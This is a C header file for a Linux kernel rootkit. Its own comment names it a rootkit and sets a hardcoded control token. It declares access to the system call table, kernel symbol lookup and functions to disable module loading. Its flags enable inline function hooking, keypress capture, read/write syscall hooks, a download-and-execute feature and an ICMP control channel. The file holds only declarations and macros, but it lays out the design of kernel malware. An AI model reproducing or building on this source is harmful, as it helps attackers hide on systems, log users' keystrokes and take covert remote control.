#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/version.h>
#include <linux/unistd.h>
#include <linux/slab.h>
#include <linux/list.h>
#include <linux/fs.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 33)
#include <generated/autoconf.h>
#else
#include <linux/autoconf.h>
#endif

#define AUTH_TOKEN 0x12345678   // Authentication token for rootkit control
#define __DEBUG__ 1             // General debugging statements
#define __DEBUG_HOOK__ 1        // Debugging of inline function hooking
#define __DEBUG_KEY__ 1         // Debugging of user keypresses
#define __DEBUG_RW__ 1          // Debugging of sys_read and sys_write hooks
#define _CONFIG_DLEXEC_ 1
#define _CONFIG_ICMP_ 1

#if __DEBUG__
# define DEBUG(fmt, ...) printk(fmt, ##__VA_ARGS__)
#else
# define DEBUG(fmt, ...)
#endif

#if __DEBUG_HOOK__
# define DEBUG_HOOK(fmt, ...) printk(fmt, ##__VA_ARGS__)
#else
# define DEBUG_HOOK(fmt, ...)
#endif

#if __DEBUG_KEY__
# define DEBUG_KEY(fmt, ...) printk(fmt, ##__VA_ARGS__)
#else
# define DEBUG_KEY(fmt, ...)
#endif

#if __DEBUG_RW__
# define DEBUG_RW(fmt, ...) printk(fmt, ##__VA_ARGS__)
#else
# define DEBUG_RW(fmt, ...)
#endif

extern unsigned long *sys_call_table;

char *strnstr(const char *haystack, const char *needle, size_t n);
void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size);
void *memstr(const void *haystack, const char *needle, size_t size);

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 30)
unsigned long get_symbol(char *name);
#endif

void disable_module_loading(void);
void enable_module_loading(void);

#if defined(_CONFIG_X86_64_)
extern unsigned long *ia32_sys_call_table;
#endif



void icmp_init (void);
void icmp_exit (void);

